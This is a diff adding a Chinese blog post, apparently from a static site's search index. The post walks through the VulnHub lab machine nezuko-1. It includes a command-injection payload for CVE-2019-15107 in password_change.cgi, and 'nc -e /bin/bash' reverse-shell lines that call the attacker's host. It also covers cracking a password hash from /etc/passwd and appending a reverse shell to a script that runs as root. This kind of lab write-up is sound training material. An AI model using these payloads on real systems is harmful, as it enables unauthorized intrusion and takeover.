@@ -6267,4 +6267,301 @@
         <tag>java</tag>
       </tags>
   </entry>
+  <entry>
+    <title>nezuko-1打靶记录</title>
+    <url>/2023/10/17/nezuko-1%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/</url>
+    <content><![CDATA[<h1 id="一、环境搭建"><a href="#一、环境搭建" class="headerlink" title="一、环境搭建"></a>一、环境搭建</h1><p>靶机镜像下载地址：<a class="link"   href="https://www.vulnhub.com/entry/nezuko-1%2C352/" >https://www.vulnhub.com/entry/nezuko-1%2C352/ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20231017184036448.png"
+                      alt="image-20231017184036448"
+                ></p>
+<p>然后设置虚拟机名和存储位置</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20231017184104934.png"
+                      alt="image-20231017184104934"
+                ></p>
+<p>设置网络适配器为nat模式</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20231017184143582.png"
+                      alt="image-20231017184143582"
+                ></p>
+<p>然后启动虚拟机就可以了。</p>
+<h1 id="二、信息收集"><a href="#二、信息收集" class="headerlink" title="二、信息收集"></a>二、信息收集</h1><h2 id="发现存活主机"><a href="#发现存活主机" class="headerlink" title="发现存活主机"></a>发现存活主机</h2><p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20231017192724463.png"
+                      alt="image-20231017192724463"
+                ></p>
+<p>我们可以得到目标靶机的ip是192.168.113.130</p>
+<h2 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h2><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -sV 192.168.113.130</span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20231017193002658.png"
+                      alt="image-20231017193002658"
+                ></p>
+<p>可以看到目标靶机开放了22(ssh)端口和80(web)端口</p>
+<h1 id="三、漏洞挖掘与利用"><a href="#三、漏洞挖掘与利用" class="headerlink" title="三、漏洞挖掘与利用"></a>三、漏洞挖掘与利用</h1><p>访问靶机对应的web服务</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20231017193135097.png"
+                      alt="image-20231017193135097"
+                ></p>
+<p>使用dirsearch扫描靶机的目录</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20231017193422774.png"
+                      alt="image-20231017193422774"
+                ></p>
+<p>可以看到有一个robots.txt文件和一个sqmple路由</p>
+<p>访问robots.txt 文件</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20231017193514862.png"
+                      alt="image-20231017193514862"
+                ></p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">NBUW45BAMZZG63JANZSXU5LLN4QDUIDUNBUXGIDJOMQG433UEB2GQZJAOJUWO2DUEBYG64TUEB2G6IDFNZ2W2ZLSMF2GKIC6O5PA====</span><br></pre></td></tr></table></figure></div>
+
+<p>是一段编码的字符串</p>
+<p>进行base32解码</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20231017193607479.png"
+                      alt="image-20231017193607479"
+                ></p>
+<p>发现是给了一个提示：告诉我们这不是枚举的正确端口</p>
+<p>访问扫描出来的另一个路由</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20231017194313523.png"
+                      alt="image-20231017194313523"
+                ></p>
+<p>有一个txt文件里面啥也没有</p>
+<p>提示告诉我们端口不对，那么说明我们端口扫描不完全</p>
+<p>重新扫描端口</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -A -T4 -O -p 0-65535 192.168.113.130</span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20231017194411843.png"
+                      alt="image-20231017194411843"
+                ></p>
+<p>可以看到还开放了一个13337端口对应也是web服务</p>
+<p>访问这个端口的服务</p>
+<p>这里注意要使用https访问</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20231017211824141.png"
+                      alt="image-20231017211824141"
+                ></p>
+<p>可以看到是一个后台管理登录系统</p>
+<p>尝试弱口令爆破</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20231017212037424.png"
+                      alt="image-20231017212037424"
+                ></p>
+<p>爆破失败，尝试了常见的几个弱口令也没有成功</p>
+<p>然后尝试去搜索这个管理系统的历史漏洞</p>
+<p>然后搜索到一个CVE-2019-15107是一个远程命令执行漏洞</p>
+<p>文章链接：<a class="link"   href="https://blog.csdn.net/qq_24481913/article/details/132043461" >https://blog.csdn.net/qq_24481913/article/details/132043461 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<p>尝试进行cve漏洞利用</p>
+<p>漏洞利用点在password_change.cgi路由</p>
+<p>在重置密码这个路由存在一个代码执行漏洞</p>
+<p>paylaod：</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">user=rootxx&amp;pam=&amp;expired=2&amp;old=test|id&amp;new1=test2&amp;new2=test2</span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20231017213526944.png"
+                      alt="image-20231017213526944"
+                ></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20231017213638043.png"
+                     
+                ></p>
+<p>尝试反弹shell</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">user=rootxx&amp;pam=&amp;expired=2&amp;old=test|nc -e /bin/bash 192.168.113.129 4321&amp;new1=test2&amp;new2=test2</span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20231017213822500.png"
+                      alt="image-20231017213822500"
+                ></p>
+<p>kali开启监听4321端口</p>
+<p>反弹成功</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20231017213854292.png"
+                      alt="image-20231017213854292"
+                ></p>
+<p>进入交互模式</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">python -c &quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span><br></pre></td></tr></table></figure></div>
+
+<p>进入全交互模式失败</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20231017214242995.png"
+                      alt="image-20231017214242995"
+                ></p>
+<h1 id="四、提权"><a href="#四、提权" class="headerlink" title="四、提权"></a>四、提权</h1><p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20231017214337851.png"
+                      alt="image-20231017214337851"
+                ></p>
+<p>我们现在只是一个普通用户权限，要想拿下这台服务器就要提升权限</p>
+<p>提权最常用的就是suid提权</p>
+<p>首先就是查找有s权限的命令</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">find / -user root -perm -4000 -print 2&gt;/dev/null</span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20231017214529391.png"
+                      alt="image-20231017214529391"
+                ></p>
+<p>没有常见的suid提权使用的命令</p>
+<p>那么这种方法就不能使用了</p>
+<p>这里尝试读取一下&#x2F;etc&#x2F;passwd</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20231017214732424.png"
+                      alt="image-20231017214732424"
+                ></p>
+<p>可以看到zenitsu用户的密码以加密的形式存放在这里</p>
+<p>使用john进行解密</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20231017214934759.png"
+                      alt="image-20231017214934759"
+                ></p>
+<p>解开这个用户的密码是meowmeow</p>
+<p>尝试切换用户提权</p>
+<p>但是想要使用su命令要切换成全交互式shell</p>
+<p>我们这里可以先尝试使用ssh连接</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20231017215222171.png"
+                      alt="image-20231017215222171"
+                ></p>
+<p>但是连接失败，那就只能尝试切换成全交互式shell</p>
+<p>查看靶机安装的python版本</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">which python python2 python3</span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20231017215541184.png"
+                      alt="image-20231017215541184"
+                ></p>
+<p>安装的是python3，这也就是我们刚才用python提升失败的原因</p>
+<p>那只用用python3来提升交互模式就行</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 -c &#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;;</span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20231017215626779.png"
+                      alt="image-20231017215626779"
+                ></p>
+<p>使用su切换到zenitsu用户</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20231017215712295.png"
+                      alt="image-20231017215712295"
+                ></p>
+<p>切换用户成功</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20231017215928046.png"
+                      alt="image-20231017215928046"
+                ></p>
+<p>但是并不是root权限</p>
+<p>然后再&#x2F;home&#x2F;zenitsu&#x2F;to_nezuko下找到一个有root权限的文件</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20231017220034339.png"
+                      alt="image-20231017220034339"
+                ></p>
+<p>那么它可以以root权限运行，那我们可以使用它进行反弹shell</p>
+<p>尝试写入</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo &quot;nc -e /bin/bash 192.168.113.129 4321&quot; &gt; send_message_to_nezuko.sh</span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20231017220328524.png"
+                      alt="image-20231017220328524"
+                ></p>
+<p>但是写入失败了</p>
+<p>用lsattr命令可以查看隐藏权限</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20231017220425516.png"
+                      alt="image-20231017220425516"
+                ></p>
+<p>chattr +a file使file文件只能追加内容，不能删除、重命名，因此可以直接追加内容</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20231017220518719.png"
+                      alt="image-20231017220518719"
+                ></p>
+<p>查看文件内容</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20231017220542396.png"
+                      alt="image-20231017220542396"
+                ></p>
+<p>可以看到反弹shell的代码写入成功了</p>
+<p>然后运行sh文件反弹shell</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20231017221042296.png"
+                      alt="image-20231017221042296"
+                ></p>
+<p>kali开启监听</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20231017221121610.png"
+                      alt="image-20231017221121610"
+                ></p>
+<p>可以看到已经成功拿下这台服务器</p>
+]]></content>
+      <tags>
+        <tag>渗透-靶机-nezuko系列</tag>
+      </tags>
+  </entry>
 </search>
